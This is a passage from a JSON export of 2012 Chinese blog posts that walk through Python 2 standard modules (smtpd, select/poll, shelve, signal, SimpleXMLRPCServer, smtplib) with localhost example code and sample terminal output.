'test_to_copy']\nBEFORE: []\nAFTER: ['test.py']</p>\n\n<p>SOURCE:\nMode    : 33188\nCreated : Fri Jun 15 11:08:12 2012\nAccessed: Fri Jun 15 11:08:12 2012\nModified: Fri Jun 15 11:08:11 2012\nDEST:\nMode    : 33188\nCreated : Fri Jun 15 11:08:12 2012\nAccessed: Fri Jun 15 11:08:12 2012\nModified: Fri Jun 15 11:08:11 2012</p>\n\n<p>BEFORE: -rwxr-xr-x 1 dongwm users 965  6月 14 17:45 test1.py\nAFTER : -rw-r--r-- 1 dongwm users 965  6月 14 17:45 test1.py</p>\n\n<p>BEFORE:\nMode    : 33188\nCreated : Fri Jun 15 11:11:39 2012\nAccessed: Thu Jun 14 17:45:57 2012\nModified: Thu Jun 14 17:45:54 2012\nAFTER :\nMode    : 33188\nCreated : Fri Jun 15 11:14:23 2012\nAccessed: Fri Jun 15 11:14:23 2012\nModified: Fri Jun 15 11:14:20 2012</p>\n\n<p>BEFORE:\nls: 无法访问/tmp/example: 没有那个文件或目录\nAFTER:\n总用量 28\n4 -rw-r--r--   1 dongwm users   468  6月 15 11:08 test.py\n4 drwxr-xr-x   2 dongwm users  4096  6月 15 11:08 .\n20 drwxrwxrwt 355 root   root  20480  6月 15 11:16 ..</p>\n\n<p>BEFORE: example :  ['test.py']\nAFTER : example2:  ['test.py']</p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "15"
    }
  },
  {
    "id": 193,
    "title": "关于smtpd研究",
    "category": "python模块研究",
    "tags": [
      "smtpd"
    ],
    "url": "/archives/guanyu-4/",
    "content": "<p>前言：smtpd？大家是不是一下子想到了smtplib？其实smtpd是一个实现建立简单邮件传输协议服务器的模块，smtplib是一个实现smtp客户端的模块。</p>\n\n<p><pre class=\"sh_python\">\nimport smtpd #服务器端\nimport asyncore</p>\n\n<p>class CustomSMTPServer(smtpd.SMTPServer): #定一个自己的SMTPServer类</p>\n\n<p>    def process_message(self, peer, mailfrom, rcpttos, data): \n        print 'Receiving message from:', peer #客户端的ip和端口\n        print 'Message addressed from:', mailfrom  #发件人 \n        print 'Message addressed to  :', rcpttos #手件人列表\n        print 'Message length        :', len(data) #信息长度\n        return</p>\n\n<p>server = CustomSMTPServer(('127.0.0.1', 1025), None) #只需要服务器的ip和端口</p>\n\n<p>asyncore.loop()\n</pre></p>\n\n<p>客户端</p>\n\n<p><pre class=\"sh_python\">\nimport smtplib\nimport email.utils\nfrom email.mime.text import MIMEText</p>\n\n<p>msg = MIMEText('This is the body of the message.') #邮件主体\nmsg['To'] = email.utils.formataddr(('Recipient', 'recipient@example.com'))  #收件人，这个是邮件内容里面的，就是我们收件会告诉我们，要不然就是一个未定义状态\nmsg['From'] = email.utils.formataddr(('Author', 'author@example.com')) #发件人 \nmsg['Subject'] = 'Simple test message' #邮件主题</p>\n\n<p>server = smtplib.SMTP('127.0.0.1', 1025)\nserver.set_debuglevel(True) # 显示debug\ntry:\n    server.sendmail('author@example.com', ['recipient@example.com'], msg.as_string()) #最后一个参数是构建好的邮件的字符串模式\nfinally:\n    server.quit()\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport smtpd\nimport asyncore</p>\n\n<p>server = smtpd.DebuggingServer(('127.0.0.1', 1025), None) #这是模块自带的调试服务器</p>\n\n<p>asyncore.loop()\n~\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>---------- MESSAGE FOLLOWS ----------\nContent-Type: text/plain; charset=\"us-ascii\"\nMIME-Version: 1.0\nContent-Transfer-Encoding: 7bit\nTo: Recipient &lt;recipient@example.com&gt;\nFrom: Author &lt;author@example.com&gt;\nSubject: Simple test message\nX-Peer: 127.0.0.1</p>\n\n<p>This is the body of the message.\n------------ END MESSAGE ------------</p>\n\n<p><pre class=\"sh_python\">\nimport smtpd\nimport asyncore\nserver = smtpd.PureProxy(('127.0.0.1', 1025), ('mail', 25)) #设置成代理，让将数据传到本地25端口发送邮件\nasyncore.loop()\n</pre></p>\n\n<p>查看日志需要读取你的比如postfix或者sendmail的mail日志</p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "15"
    }
  },
  {
    "id": 194,
    "title": "关于select研究",
    "category": "linux基础",
    "tags": [
      "select"
    ],
    "url": "/archives/guanyuselectyanjiu/",
    "content": "<p>前言：select可以完成非阻塞（所谓非阻塞方式non-block，就是进程或线程执行此函数时不必非要等待事件的发生，一旦执行肯定返回，以返回值的不同 来反映函数的执行情况，如果事件发生则与阻塞方式相同，若事件没有发生则返回一个代码来告知事件未发生，而进程或线程继续执行，所以效率较高）方式工作的 程序，还能够监视我们需要监视的文件描述符，socket，pipe的变化情况——读写或是异常（windows只能用于socket）。他可以访问select()和epoll()的系统调用，他通常用来实现轮询，也可以在不使用多线程和或者子进程的前提下跨多个I／O流进行多重处理</p>\n\n<p>服务器的程序：</p>\n\n<p><pre class=\"sh_python\"></p>\n\n<p>import select\nimport socket\nimport sys\nimport Queue</p>\n\n<p>server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver.setblocking(0) #设置socket非阻塞</p>\n\n<p>server_address = ('localhost', 10000)\nprint &gt;&gt;sys.stderr, 'starting up on %s port %s' % server_address\nserver.bind(server_address)</p>\n\n<p>server.listen(5)\ninputs = [server] #等待输入对象的列表\noutputs = [] #等待输出对想的列表\nmessage_queues = {} #异常情况的对象列表\nwhile inputs:\nprint &gt;&gt;sys.stderr, '\\nwaiting for the next event'\nreadable, writable, exceptional = select.select(inputs, outputs, inputs) #其实还是第四个参数：timeout，未设置表示函数一直等待直到准备好一个文件描述符\nfor s in readable:  #数据可以读取了\nif s is server:\nconnection, client_address = s.accept()  #文件描述符准备好就接受连接\nprint &gt;&gt;sys.stderr, 'new connection from', client_address\nconnection.setblocking(0)\ninputs.append(connection) #操作完继续放到查询队列\nmessage_queues[connection] = Queue.Queue()  #为我们要发送的数据把连接给一个队列\nelse:\ndata = s.recv(1024)\nif data:  #一个客户端sokcet有数据准备着\nprint &gt;&gt;sys.stderr, 'received \"%s\" from %s' % (data, s.getpeername())\nmessage_queues[s].put(data) ＃往队列中的连接写入数据\nif s not in outputs:\noutputs.append(s)  #为响应增加输出通道\nelse: #关闭空连接\nprint &gt;&gt;sys.stderr, 'closing', client_address, 'after reading no data'\nif s in outputs: #停止监听这个等待输入的连接\noutputs.remove(s)  #也删除等待输出的连接\ninputs.remove(s)\ns.close()</p>\n\n<p>del message_queues[s]  #从队列把这个连接内容也删掉\nfor s in writable: #缓存区已经有空间了，可以写入了\ntry:\nnext_msg = message_queues[s].get_nowait() #获取输出的数据\nexcept Queue.Empty: #队列没有数据\nprint &gt;&gt;sys.stderr, 'output queue for', s.getpeername(), 'is empty'\noutputs.remove(s)  #停止查询这个等待输出连接\nelse:\nprint &gt;&gt;sys.stderr, 'sending \"%s\" to %s' % (next_msg, s.getpeername())\ns.send(next_msg) #发送数据\nfor s in exceptional:\nprint &gt;&gt;sys.stderr, 'handling exceptional condition for', s.getpeername()\ninputs.remove(s)\nif s in outputs:\noutputs.remove(s)\ns.close()\ndel message_queues[s]\n\n</pre></p>\n\n<p>客户端程序：</p>\n\n<p><pre class=\"sh_python\">\nimport socket\nimport sys\nmessages = [ 'This is the message. ',\n             'It will be sent ',\n             'in parts.',\n             ]\nserver_address = ('localhost', 10000)</p>\n\n<p>socks = [ socket.socket(socket.AF_INET, socket.SOCK_STREAM),\n          socket.socket(socket.AF_INET, socket.SOCK_STREAM),\n          ]   #创建2个socket</p>\n\n<p>print &gt;&gt;sys.stderr, 'connecting to %s port %s' % server_address\nfor s in socks:\n    s.connect(server_address)  #通过2个socket连接，数据都是发送接受2次</p>\n\n<p>for message in messages:</p>\n\n<p>    for s in socks:\n        print &gt;&gt;sys.stderr, '%s: sending \"%s\"' % (s.getsockname(), message)\n        s.send(message)  #发送数据</p>\n\n<p>    for s in socks:\n        data = s.recv(1024)  #接受数据\n        print &gt;&gt;sys.stderr, '%s: received \"%s\"' % (s.getsockname(), data)\n        if not data:\n            print &gt;&gt;sys.stderr, 'closing socket', s.getsockname()\n            s.close()\n</pre></p>\n\n<p>看2端的打印信息：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test1.py  #客户端\nconnecting to localhost port 10000\n('127.0.0.1', 39054): sending \"This is the message. \"\n('127.0.0.1', 39055): sending \"This is the message. \"\n('127.0.0.1', 39054): received \"This is the message. \"\n('127.0.0.1', 39055): received \"This is the message. \"\n('127.0.0.1', 39054): sending \"It will be sent \"\n('127.0.0.1', 39055): sending \"It will be sent \"\n('127.0.0.1', 39054): received \"It will be sent \"\n('127.0.0.1', 39055): received \"It will be sent \"\n('127.0.0.1', 39054): sending \"in parts.\"\n('127.0.0.1', 39055): sending \"in parts.\"\n('127.0.0.1', 39054): received \"in parts.\"\n('127.0.0.1', 39055): received \"in parts.\"</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nstarting up on localhost port 10000</p>\n\n<p>waiting for the next event\nnew connection from ('127.0.0.1', 39054)</p>\n\n<p>waiting for the next event\nnew connection from ('127.0.0.1', 39055)\nreceived \"This is the message. \" from ('127.0.0.1', 39054)</p>\n\n<p>waiting for the next event\nreceived \"This is the message. \" from ('127.0.0.1', 39055)\nsending \"This is the message. \" to ('127.0.0.1', 39054)</p>\n\n<p>waiting for the next event\noutput queue for ('127.0.0.1', 39054) is empty\nsending \"This is the message. \" to ('127.0.0.1', 39055)</p>\n\n<p>waiting for the next event\noutput queue for ('127.0.0.1', 39055) is empty</p>\n\n<p>waiting for the next event\nreceived \"It will be sent \" from ('127.0.0.1', 39054)</p>\n\n<p>waiting for the next event\nreceived \"It will be sent \" from ('127.0.0.1', 39055)\nsending \"It will be sent \" to ('127.0.0.1', 39054)</p>\n\n<p>waiting for the next event\noutput queue for ('127.0.0.1', 39054) is empty\nsending \"It will be sent \" to ('127.0.0.1', 39055)</p>\n\n<p>waiting for the next event\noutput queue for ('127.0.0.1', 39055) is empty</p>\n\n<p>waiting for the next event\nreceived \"in parts.\" from ('127.0.0.1', 39054)\nreceived \"in parts.\" from ('127.0.0.1', 39055)</p>\n\n<p>waiting for the next event\nsending \"in parts.\" to ('127.0.0.1', 39054)\nsending \"in parts.\" to ('127.0.0.1', 39055)</p>\n\n<p>waiting for the next event\noutput queue for ('127.0.0.1', 39054) is empty\noutput queue for ('127.0.0.1', 39055) is empty</p>\n\n<p>waiting for the next event\nclosing ('127.0.0.1', 39055) after reading no data</p>\n\n<p>waiting for the next event\nclosing ('127.0.0.1', 39055) after reading no data  #发现没有数据了\nwaiting for the next event  #一直在等待数据</p>\n\n<p><pre class=\"sh_python\">\nimport select\nimport socket\nimport sys\nimport Queue</p>\n\n<p>server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #建立tcp socket\nserver.setblocking(0)</p>\n\n<p>server_address = ('localhost', 10000)\nprint &gt;&gt;sys.stderr, 'starting up on %s port %s' % server_address\nserver.bind(server_address) #绑定socket到地址和端口</p>\n\n<p>server.listen(5) #监听传入的连接</p>\n\n<p># Keep up with the queues of outgoing messages\nmessage_queues = {} #建立传出的消息队列\nTIMEOUT = 1000 #设置poll超时值（毫秒为单位）\nREAD_ONLY = select.POLLIN | select.POLLPRI | select.POLLHUP | select.POLLERR #其中POLLIN事件表示输入准备，POLLPRI表示优先的输入准备，POLLHUP表示通道被关闭，POLLERR表示错误\nREAD_WRITE = READ_ONLY | select.POLLOUT #其中POLLOUT表示状态可以收取传入\npoller = select.poll() #poll类似select,但底层实现更加高效\npoller.register(server, READ_ONLY) #设置socket被注册让传入的连接和数据触发事件\nfd_to_socket = { server.fileno(): server,}#poll()返回一个包含文件描述符和上面说的状态的元组列表，从文件描述符号码映射对象需要检索socket读取或写入这个列表\nwhile True:\n    print &gt;&gt;sys.stderr, '\\nwaiting for the next event'\n    events = poller.poll(TIMEOUT)\n    for fd, flag in events:\n        s = fd_to_socket[fd] #从文件描述符找回从实际的socket\n        if flag &amp; (select.POLLIN | select.POLLPRI): #当已经准备好输入\n            if s is server:\n                connection, client_address = s.accept() #可读socket准备接受连接\n                print &gt;&gt;sys.stderr, 'new connection from', client_address\n                connection.setblocking(0)\n                fd_to_socket[ connection.fileno() ] = connection\n                poller.register(connection, READ_ONLY)\n                message_queues[connection] = Queue.Queue() \n            else:\n                data = s.recv(1024)\n                if data:\n                    print &gt;&gt;sys.stderr, 'received \"%s\" from %s' % (data, s.getpeername())\n                    message_queues[s].put(data) \n                    poller.modify(s, READ_WRITE) #为响应增加输出通道\n                else:\n                    print &gt;&gt;sys.stderr, 'closing', client_address, 'after reading no data' \n                    poller.unregister(s) #停止在连接上监听输入\n                    s.close()\n                    del message_queues[s] #从队列中移出这个连接\n        elif flag &amp; select.POLLHUP: #当通道已经关闭\n            print &gt;&gt;sys.stderr, 'closing', client_address, 'after receiving HUP'\n            poller.unregister(s)\n            s.close()\n        elif flag &amp; select.POLLOUT:  #当已经准备好发送\n            try:\n                next_msg = message_queues[s].get_nowait()\n            except Queue.Empty:\n                print &gt;&gt;sys.stderr, 'output queue for', s.getpeername(), 'is empty'\n                poller.modify(s, READ_ONLY) #没有消息等待\n            else:\n                print &gt;&gt;sys.stderr, 'sending \"%s\" to %s' % (next_msg, s.getpeername())\n                s.send(next_msg)\n        elif flag &amp; select.POLLERR: #当出现错误\n            print &gt;&gt;sys.stderr, 'handling exceptional condition for', s.getpeername()\n            poller.unregister(s)\n            s.close()\n            del message_queues[s]\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nstarting up on localhost port 10000</p>\n\n<p>waiting for the next event</p>\n\n<p>waiting for the next event  #因为超时是1秒，没有数据一秒钟连一次</p>\n\n<p>waiting for the next event</p>\n\n<p>waiting for the next event\nnew connection from ('127.0.0.1', 57127)  #当server准备接受连接，发现了这2个连接。</p>\n\n<p>waiting for the next event\nnew connection from ('127.0.0.1', 57128)\nreceived \"This is the message. \" from ('127.0.0.1', 57127) #因为连接存在，接受数据</p>\n\n<p>waiting for the next event\nsending \"This is the message. \" to ('127.0.0.1', 57127) #当发现输出通道准备好，发送数据出去\nreceived \"This is the message. \" from ('127.0.0.1', 57128)</p>\n\n<p>waiting for the next event\noutput queue for ('127.0.0.1', 57127) is empty #对列空了，修改成准备接受读入\nsending \"This is the message. \" to ('127.0.0.1', 57128)</p>\n\n<p>waiting for the next event\noutput queue for ('127.0.0.1', 57128) is empty</p>\n\n<p>waiting for the next event\nreceived \"It will be sent \" from ('127.0.0.1', 57127)\nreceived \"It will be sent \" from ('127.0.0.1', 57128)</p>\n\n<p>waiting for the next event\nsending \"It will be sent \" to ('127.0.0.1', 57127)\nsending \"It will be sent \" to ('127.0.0.1', 57128)</p>\n\n<p>waiting for the next event\noutput queue for ('127.0.0.1', 57127) is empty\noutput queue for ('127.0.0.1', 57128) is empty</p>\n\n<p>waiting for the next event\nreceived \"in parts.\" from ('127.0.0.1', 57127)\nreceived \"in parts.\" from ('127.0.0.1', 57128)</p>\n\n<p>waiting for the next event\nsending \"in parts.\" to ('127.0.0.1', 57127)\nsending \"in parts.\" to ('127.0.0.1', 57128)</p>\n\n<p>waiting for the next event\noutput queue for ('127.0.0.1', 57127) is empty\noutput queue for ('127.0.0.1', 57128) is empty</p>\n\n<p>waiting for the next event\nclosing ('127.0.0.1', 57128) after reading no data\nclosing ('127.0.0.1', 57128) after reading no data</p>\n\n<p>waiting for the next event</p>\n\n<p>waiting for the next event</p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "15"
    }
  },
  {
    "id": 195,
    "title": "关于shelve研究",
    "category": "python模块研究",
    "tags": [
      "shelve"
    ],
    "url": "/archives/guanyushelveyanjiu/",
    "content": "<p>前言：shelve模块实现了对任意可被pickle的Python对象进行持久性存储, 也提供类字典API给我们使用，当使用关系数据库是一种浪费的时候, shelve模块可以为Python对象提供一个简单的持久性存储选择. 就像使用字典一样, 通过关键字访问shelf对象. 其值经过pickle, 写入到由anydbm创建和管理的数据库.</p>\n\n<p><pre class=\"sh_python\">\nimport shelve</p>\n\n<p>s = shelve.open('test.db')   #创建Shelf对象,\ntry:\n    s['key1'] = { 'int': 10, 'float':9.5, 'string':'Sample data' }  #写入key－value\nfinally:\n    s.close()\ns = shelve.open('test.db')   #这里读取，可以设置 flag='r'  表示值是只读\ntry:\n    print s['key1']\nfinally:\n    s.close()\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\n{'int': 10, 'float': 9.5, 'string': 'Sample data'}</p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "15"
    }
  },
  {
    "id": 196,
    "title": "关于signal研究",
    "category": "python模块研究",
    "tags": [
      "signal"
    ],
    "url": "/archives/guanyusignalyanjiu/",
    "content": "<p>前言：signal是接收异步系统事件通知的模块，</p>\n\n<p>信号是操作系统的功能，它提供了一个通知你事件的方案，并异步处理的手段。 他们可以通过系统本身产生或从一个过程发送到另一个（一个进程一旦接收到信号就会打断原来的程序执行流程来处理信号）。常用信号包括SIGINT （终止进程  中断进程  (control+c)），SIGTERM   （终止进程     软件终止信号），SIGKILL   （终止进程     杀死进程）等</p>\n\n<p><pre class=\"sh_python\">\nimport signal\nimport os\nimport time</p>\n\n<p>def receive_signal(signum, stack):#接收信号是通过建立一个回调函数，称为一个<em>信号处理</em> ，信号发生时被调用\n    print 'Received:', signum</p>\n\n<p>signal.signal(signal.SIGUSR1, receive_signal) \nsignal.signal(signal.SIGUSR2, receive_signal)</p>\n\n<p>print 'My PID is:', os.getpid()</p>\n\n<p>while True:\n    print 'Waiting...'\n    time.sleep(3) #每次暂停3秒钟。 当一个信号到来时，呼叫中断唤醒并用receive_signal做信号处理\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nMy PID is: 5418\nWaiting...\nReceived: 12  #kill -USR2 5418  杀死USR2的信号  5418是PID号码\nWaiting...\nReceived: 12 #再执行一遍\nWaiting...\nWaiting...\nWaiting...\nWaiting...\nReceived: 10 #kill -USR1 5418  杀死USR1的信号\nWaiting...\nWaiting...\nTraceback (most recent call last):  #kill -INT 5418 中断进程  (相当于control+c)\nFile \"test.py\", line 15, in &lt;module&gt;\ntime.sleep(3)\nKeyboardInterrupt</p>\n\n<p><pre class=\"sh_python\">\nimport signal\nimport time</p>\n\n<p>def receive_alarm(signum, stack):\n    print 'Alarm :', time.ctime()</p>\n\n<p>signal.signal(signal.SIGALRM, receive_alarm)\nsignal.alarm(2) #2秒后受到报警，它避免无限期阻塞的I / O操作或其他系统调用</p>\n\n<p>print 'Before:', time.ctime()\ntime.sleep(4)\nprint 'After :', time.ctime()\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nBefore: Fri Jun 15 11:57:16 2012\nAlarm : Fri Jun 15 11:57:18 2012 #报警\nAfter : Fri Jun 15 11:57:18 2012  #本来应该11.57.20才打印</p>\n\n<p><pre class=\"sh_python\">\nimport signal\nimport os\nimport time</p>\n\n<p>def do_exit(sig, stack):  #设置一个处理器\n    raise SystemExit('Exiting')</p>\n\n<p>signal.signal(signal.SIGINT, signal.SIG_IGN) #使用SIG_IGN忽略信息，代替默认的SIGINT\nsignal.signal(signal.SIGUSR1, do_exit)  #设置当使用kill －USR1 时候调用do_exit</p>\n\n<p>print 'My PID:', os.getpid()</p>\n\n<p>signal.pause() #等待接收信号\n</pre></p>\n\n<p>执行结果：\ndongwm@linux-dongwm:~&gt; python test.py\nMy PID: 6647\n^CExiting  #kill -INT 6647没管用，使用ctrl+c也不管事，使用kill -USR1 6647 杀掉</p>\n\n<p><pre class=\"sh_python\">\nimport signal\nimport threading\nimport os\nimport time</p>\n\n<p>def signal_handler(num, stack):  \n    print 'Received signal %d in %s' % (num, threading.currentThread())</p>\n\n<p>signal.signal(signal.SIGUSR1, signal_handler)</p>\n\n<p>def wait_for_signal():\n    print 'Waiting for signal in', threading.currentThread()\n    signal.pause()\n    print 'Done waiting'</p>\n\n<p>receiver = threading.Thread(target=wait_for_signal, name='receiver') #将做等待接受信号处理放到线程里面\nreceiver.start()\ntime.sleep(0.1)</p>\n\n<p>def send_signal():\n    print 'Sending signal in', threading.currentThread()\n    os.kill(os.getpid(), signal.SIGUSR1)</p>\n\n<p>sender = threading.Thread(target=send_signal, name='sender') ##将做发送信号处理放到另外的线程里面\nsender.start()\nsender.join()</p>\n\n<p>print 'Waiting for', receiver\nsignal.alarm(2) #接收线程将永远不会退出，这里设置非阻塞\nreceiver.join()\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>Waiting for signal in &lt;Thread(receiver, started -1221059728)&gt;\nSending signal in &lt;Thread(sender, started -1229456528)&gt;\nReceived signal 10 in &lt;_MainThread(MainThread, started -1219656000)&gt; #主线程接收信号\nWaiting for &lt;Thread(receiver, started -1221059728)&gt;\n闹钟\n<pre class=\"sh_python\">\nimport signal\nimport time\nimport threading</p>\n\n<p>def signal_handler(num, stack):\n    print time.ctime(), 'Alarm in', threading.currentThread()</p>\n\n<p>signal.signal(signal.SIGALRM, signal_handler)</p>\n\n<p>def use_alarm():\n    print time.ctime(), 'Setting alarm in', threading.currentThread()\n    signal.alarm(1)\n    print time.ctime(), 'Sleeping in', threading.currentThread()\n    time.sleep(3)\n    print time.ctime(), 'Done with sleep'</p>\n\n<p>alarm_thread = threading.Thread(target=use_alarm, name='alarm_thread') #启动一个线程，将不会收到信号\nalarm_thread.start()\ntime.sleep(0.1)</p>\n\n<p>print time.ctime(), 'Waiting for', alarm_thread\nalarm_thread.join()</p>\n\n<p>print time.ctime(), 'Exiting normally'\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nFri Jun 15 12:16:22 2012 Setting alarm in &lt;Thread(alarm_thread, started -1220539536)&gt;\nFri Jun 15 12:16:22 2012 Sleeping in &lt;Thread(alarm_thread, started -1220539536)&gt;\nFri Jun 15 12:16:22 2012 Waiting for &lt;Thread(alarm_thread, started -1220539536)&gt;\nFri Jun 15 12:16:25 2012 Done with sleep\nFri Jun 15 12:16:25 2012 Alarm in &lt;_MainThread(MainThread, started -1219135808)&gt; #子线程报警被主线程收到\nFri Jun 15 12:16:25 2012 Exiting normally</p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "15"
    }
  },
  {
    "id": 197,
    "title": "关于SimpleXMLRPCServer研究",
    "category": "python模块研究",
    "tags": [
      "SimpleXMLRPCServer"
    ],
    "url": "/archives/guanyusimplexmlrpcserveryanjiu/",
    "content": "<p>前言：SimpleXMLRPCServer顾名思义就是实现XML-RPC的远程调用服务器</p>\n\n<p><pre class=\"sh_python\">\nfrom SimpleXMLRPCServer import SimpleXMLRPCServer  #服务器端\nimport logging\nimport os</p>\n\n<p>logging.basicConfig(level=logging.DEBUG)  #记录日志级别为DEBUG</p>\n\n<p>server = SimpleXMLRPCServer(('localhost', 9000), logRequests=True)  #绑定到9000端口 假如指定allow_none=True，接受返回值是none</p>\n\n<p>def list_contents(dir_name):  #一个响应操作方法  \n    logging.debug('list_contents(%s)', dir_name)  #记录日志\n    return os.listdir(dir_name)  #给客户端返回结果，这个例子返回当前目录的所有文件名\ndef my_function(a, b): #这个响应方法含有参数\n    return a * b\nclass DirectoryService: #一个响应类\n    def list(self, dir_name):\n        return os.listdir(dir_name)\nclass ServiceRoot:  #添加一个空类\n    pass</p>\n\n<p>class DirectoryService:  #这个类是定义响应方法的类\n    def list(self, dir_name):\n        return os.listdir(dir_name)</p>\n\n<p>root = ServiceRoot()\nroot.dir = DirectoryService()  #就是为了在使用ServiceRoot.dir的时候找到DirectoryService()\n server.register_function(list_contents,'dir')  #在服务器注册这个方法 会表示把这个方法重定义成'dir'，客户端使用proxy.dir而不是proxy.list_contents\nserver.register_function(os.mkdir, 'dir.create')  #注册的方法别名也支持'.'，这里这个方法是proxy.dir.create\nserver.register_function(my_function, 'multiply args')  #这个在调用时是getattr(proxy, 'multiply args')(5, 5) 使用getattr是因为这个注册的方法名字'multiply args'含有空格\nserver.register_instance(DirectoryService())  #用类的方法注册  只在在客户端使用proxy.list （list是这个类中定义的方法）\nserver.register_instance(root, allow_dotted_names=True) #指定容许类中的'.' 这样调用：proxy.dir.list\ntry: \n    print 'Use Control-C to exit'\n    server.serve_forever()  #loop运行\nexcept KeyboardInterrupt:\n    print 'Exiting'\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport xmlrpclib  #客户端</p>\n\n<p>proxy = xmlrpclib.ServerProxy('http://localhost:9000')  \nprint proxy.list_contents('/tmp') #使用上面注册的这个方法找到'/tmp'下的所有文件名\n</pre></p>\n\n<p><pre class=\"sh_python\">\nfrom SimpleXMLRPCServer import SimpleXMLRPCServer\nimport os\nimport inspect</p>\n\n<p>server = SimpleXMLRPCServer(('localhost', 9000), logRequests=True)</p>\n\n<p>def expose(f):  #自定义一个装饰器，返回的方法的exposed属性为真\n    f.exposed = True\n    return f\ndef is_exposed(f): #测试方法是否公开exposed\n    return getattr(f, 'exposed', False)</p>\n\n<p>class MyService:\n    PREFIX = 'prefix'\n    def _dispatch(self, method, params): #设置自己的调度方式，因为默认不会调度以'_'开始的方法，而且有些方法可能是不愿意公开的 比如下面的private（私有）\n        if not method.startswith(self.PREFIX + '.'): #设置不能直接以proxy.+方法的方式调用，而需要proxy.prefix.+方法的方式\n            raise Exception('method \"%s\" is not supported' % method)</p>\n\n<p>        method_name = method.partition('.')[2]  #获取第三个参数，也就是类的方法名字\n        func = getattr(self, method_name)            \n        if not is_exposed(func):  #判断这个方法是不是能公开，使用其中的exposed属性值判断\n            raise Exception('method \"%s\" is not supported' % method)</p>\n\n<p>        return func(*params)  #执行这个方法</p>\n\n<p>    @expose\n    def public(self):\n        return 'This is public'</p>\n\n<p>    def private(self):\n        return 'This is private'</p>\n\n<p>server.register_instance(MyService())</p>\n\n<p>try:\n    print 'Use Control-C to exit'\n    server.serve_forever()\nexcept KeyboardInterrupt:\n    print 'Exiting'\n</pre></p>\n\n<p>客户端：</p>\n\n<p><pre class=\"sh_python\">\nimport xmlrpclib</p>\n\n<p>proxy = xmlrpclib.ServerProxy('http://localhost:9000')\nprint 'public():', proxy.prefix.public()  #因为服务器的装饰器让这个方法的exposed永远为真，可以公开\ntry:\n    print 'private():', proxy.prefix.private() #因为没有设置exposed的bool值，默认是假  \nexcept Exception, err:\n    print 'ERROR:', err\ntry:\n    print 'public() without prefix:', proxy.public() #因为没有使用proxy.prefix.+方法的方式\nexcept Exception, err:\n    print 'ERROR:', err\n</pre></p>\n\n<p><pre class=\"sh_python\">\nfrom SimpleXMLRPCServer import SimpleXMLRPCServer, list_public_methods\nimport os\nimport inspect</p>\n\n<p>server = SimpleXMLRPCServer(('localhost', 9000), logRequests=True)\nserver.register_introspection_functions() #开启方法检查，如检查支持什么方法等作用</p>\n\n<p>class DirectoryService:</p>\n\n<p>    def _listMethods(self):\n        return list_public_methods(self) #返回方法列表</p>\n\n<p>    def _methodHelp(self, method):\n        f = getattr(self, method)\n        return inspect.getdoc(f)  #返回方法是否有doc文档</p>\n\n<p>    def list(self, dir_name):\n        \"\"\"list(dir_name) =&gt; [&lt;filenames&gt;] \n            Returns a list containing the contents of the named directory. \n        \"\"\"\n         return os.listdir(dir_name)</p>\n\n<p>server.register_instance(DirectoryService())</p>\n\n<p>try:\n    print 'Use Control-C to exit'\n    server.serve_forever()\nexcept KeyboardInterrupt:\n    print 'Exiting'\n</pre></p>\n\n<p>客户端：</p>\n\n<p><pre class=\"sh_python\">\nimport xmlrpclib</p>\n\n<p>proxy = xmlrpclib.ServerProxy('http://localhost:9000')\nfor method_name in proxy.system.listMethods():  #返回支持的方法列表\n    print '=' * 60\n    print method_name\n    print '-' * 60\n    print proxy.system.methodHelp(method_name)  #返回方法帮助类定义的功能，因为服务器端设置这个方法是打印文档，这里就会打印文档\n    print\n</pre></p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "15"
    }
  },
  {
    "id": 198,
    "title": "关于smtplib研究",
    "category": "python模块研究",
    "tags": [
      "smtplib"
    ],
    "url": "/archives/guanyusmtplibyanjiu/",
    "content": "<p>前言：smtplib是一个邮件传输协议的客户端模块，它与smtp服务器交互, 提供邮件发送</p>\n\n<p><pre class=\"sh_python\">\nimport smtplib\nimport email.utils\nfrom email.mime.text import MIMEText\nimport getpass</p>\n\n<p>to_email = raw_input('Recipient: ') #提示输入收件人\nservername = raw_input('Mail server name: ')  #输入服务器 比如 mail.dongwm.com\nusername = raw_input('Mail user name: ') #用户名\npassword = getpass.getpass(\"%s's password: \" % username) #输入登录密码</p>\n\n<p>msg = MIMEText('Test message from dongwm.') #主体\nmsg.set_unixfrom('author') \nmsg['To'] = email.utils.formataddr(('Recipient', to_email)) \nmsg['From'] = email.utils.formataddr(('Author', 'test@dongwm.com')) #设置发件人标识，和邮箱地址\nmsg['Subject'] = 'Test from dongwm' #完成邮件内容</p>\n\n<p>server = smtplib.SMTP(servername)\ntry:\n    server.set_debuglevel(True)</p>\n\n<p>    server.ehlo() #鉴定并询问服务器支持何种类型扩展</p>\n\n<p>    if server.has_extn('STARTTLS'):  #如果包含标识需要加密\n        server.starttls()\n        server.ehlo() # 重新确定自己的连接特性\n    server.login(username, password)\n    server.sendmail('author@example.com', [to_email], msg.as_string())\nfinally:\n    server.quit()\n</pre></p>\n\n<p>注：可以使用一个命令'VRFY'验证邮箱地址，比如是否有这个用户，但是为了防止恶意的黑客扫描用户，一般是关闭的，假如打开这个功能：</p>\n\n<p>print server.verify('unknownuser')</p>\n\n<p>结果就是：\nunknownuser : (550, '5.1.1 &lt;unknownuser&gt;... User unknown')</p>\n",
    "date": {
